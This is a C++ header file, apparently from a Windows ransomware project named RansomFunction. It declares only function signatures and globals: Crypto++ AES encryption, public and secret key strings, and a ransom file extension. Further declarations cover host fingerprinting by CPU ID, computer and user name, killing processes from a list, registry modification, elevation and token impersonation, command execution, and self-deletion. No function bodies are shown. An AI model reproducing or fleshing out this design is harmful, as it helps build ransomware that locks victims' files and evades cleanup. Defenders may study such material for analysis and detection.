#ifndef RANSOMFUNCTION_H
#define RANSOMFUNCTION_H

#ifdef _DEBUG
#pragma comment(lib, "cryptlib_DEBUG.lib")
#else
#pragma comment(lib, "cryptlib_RELEASE.lib")
#endif

#pragma comment(lib, "Crypt32.lib")
#include"pch.h"
#include<wincrypt.h>
#include<time.h>
#include <atlconv.h>
#include"RunasAdmin.h"
#include"cryptopp/crc.h"
#include"cryptopp/hex.h"
#include"cryptopp/aes.h"
#include"cryptopp/modes.h"
#include"cryptopp/osrng.h"
#include"cryptopp/filters.h"

extern string CpuCRC;
extern LPWSTR ComputerName;
extern LPWSTR UserName;
extern string pk_key;
extern string sk_key;
extern wstring extension_name;

void test();
//base64解码
//LPBYTE	CallStringToBinrary(LPWSTR lpBase64, DWORD dwLength, DWORD pcchString);
//LPWSTR	CallBinaryToString(LPBYTE lpBinrary, DWORD dwLength, DWORD pcchString);
std::wstring s2ws(const std::string& s);
//信息获取
LPWSTR	CallGetWINdowsDirectoryW();
LPDWORD	CallGetVolumeInformationW();
string	GetCpuid();
string	GetCpuInfo();
LPWSTR	CallGetComputerName();
LPWSTR	CallGetUserName();


DWORD	GetProcessSnapshot(int p1, LPCSTR lpStr, DWORD(*Function)(LPCSTR, LPPROCESSENTRY32W));
DWORD	CallStrcmp(LPCSTR lp, LPPROCESSENTRY32W pe32);
DWORD	SerachProcess(LPCSTR lpProcess);
//
LPBYTE RegQuery(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR  lpValue);
BOOL RegSet(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR  lpValue, DWORD dwType, CONST BYTE* lpData, DWORD cbData);
VOID  CallRegSet();
BOOL	CallImpersonateLoggedOnUser();
BOOL	InitString();
//BOOL	CallGetKeyboardLayoutlis();
wstring	randstr(DWORD len);
//结束指定进程
BOOL JsonCompare(vector<string> vec, wstring lpProcessName);
DWORD CallTerminatedProess(LPCSTR lp, LPPROCESSENTRY32W pe32);
VOID CallCallTerminateProcess();
VOID	RunCmd();
//VOID	FreeString();
VOID	CallReverToSelf();
VOID DeleteMyself();
#endif // !RansomFunction
